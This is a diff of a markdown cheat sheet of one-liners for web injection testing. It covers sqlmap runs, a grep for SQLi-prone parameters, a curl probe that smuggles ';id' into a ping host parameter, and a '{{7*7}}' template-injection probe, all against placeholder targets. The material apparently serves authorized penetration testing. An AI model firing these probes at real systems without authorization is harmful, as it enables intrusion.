@@ -1,36 +1,49 @@
-# Injection Testing
+# Injection triage
 
-Compact automation-oriented commands for common web injection testing.
+Fast one-liners for SQL, command and template-injection candidates.
 
-### SQLMap basic GET test
+<div class="ol-section-kicker"><span>WEB</span></div>
 
-```bash
-sqlmap -u "https://<TARGET>/<PATH>?id=1" --batch --level=2 --risk=1
-```
-
-**Tool:** sqlmap · **Platform:** Linux · **Tags:** SQLi, Automation
-
-### Dalfox reflected XSS scan
+## SQLMap single URL
 
 ```bash
-dalfox url "https://<TARGET>/<PATH>?q=test" --silence
+sqlmap -u 'https://<TARGET>/item?id=1' --batch --level=1 --risk=1
 ```
 
-**Tool:** Dalfox · **Platform:** Linux · **Tags:** XSS, Automation
+**Tool:** sqlmap · **Platform:** Linux/macOS
 
-### Nuclei web templates
+
+## SQLMap request file
 
 ```bash
-nuclei -u https://<TARGET> -severity low,medium,high,critical
+sqlmap -r request.txt --batch --level=1 --risk=1
 ```
 
-**Tool:** Nuclei · **Platform:** Linux/macOS · **Tags:** Web, Templates
+**Tool:** sqlmap · **Platform:** Linux/macOS
 
-### ffuf parameter value fuzzing
+
+## Collect SQLi-shaped parameters
 
 ```bash
-ffuf -u "https://<TARGET>/<PATH>?id=FUZZ" -w <WORDLIST> -mc all -fc 404
+cat urls.txt | grep -Ei '[?&](id|uid|item|page|cat|product|order|query)=' | uro
 ```
 
-**Tool:** ffuf · **Platform:** Linux/macOS · **Tags:** Fuzzing, Parameters
+**Tool:** grep + uro · **Platform:** Linux/macOS
 
+
+## Command-injection marker check
+
+```bash
+curl -sk 'https://<TARGET>/ping?host=127.0.0.1%3Bid'
+```
+
+**Tool:** curl · **Platform:** Cross-platform
+
+
+## SSTI arithmetic probe
+
+```bash
+curl -sk 'https://<TARGET>/?name=%7B%7B7*7%7D%7D' | grep -n '49'
+```
+
+**Tool:** curl · **Platform:** Cross-platform
